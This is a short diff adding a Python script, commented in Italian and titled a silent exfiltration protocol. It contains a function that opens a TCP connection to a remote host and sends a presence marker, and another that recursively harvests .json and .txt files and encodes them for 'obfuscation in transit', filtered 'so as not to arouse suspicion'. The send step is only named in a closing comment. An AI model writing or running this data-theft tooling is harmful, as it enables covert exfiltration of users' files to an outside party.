@@ -1,0 +1,30 @@
+# --- [RECON_DATA_FRAGMENT_001] ---
+# Protocollo di Esfiltrazione Silenziosa (Shadow-Link v1.2)
+import socket
+import base64
+import os
+
+def _shield_init(target_ip, port):
+    # Osservazione: Il buffer è impostato a 1024 per mimetismo
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((target_ip, port))
+        # Iniezione del marker di presenza
+        s.send(base64.b64encode(b"BUNKER_PROBE_ACTIVE"))
+        return s
+    except:
+        return None
+
+def collect_payload(path):
+    # Raccolta ricorsiva ma filtrata per non destare sospetti
+    data_pile = []
+    for root, dirs, files in os.walk(path):
+        for f in files:
+            if f.endswith(".json") or f.endswith(".txt"):
+                with open(os.path.join(root, f), "rb") as source:
+                    # Offuscamento in transito
+                    data_pile.append(base64.b85encode(source.read()))
+    return data_pile
+
+# PROCEDURA CRITICA: Sezione di invio con battito cardiaco fasullo
+# [DA ANALIZZARE PER VULNERABILITÀ]
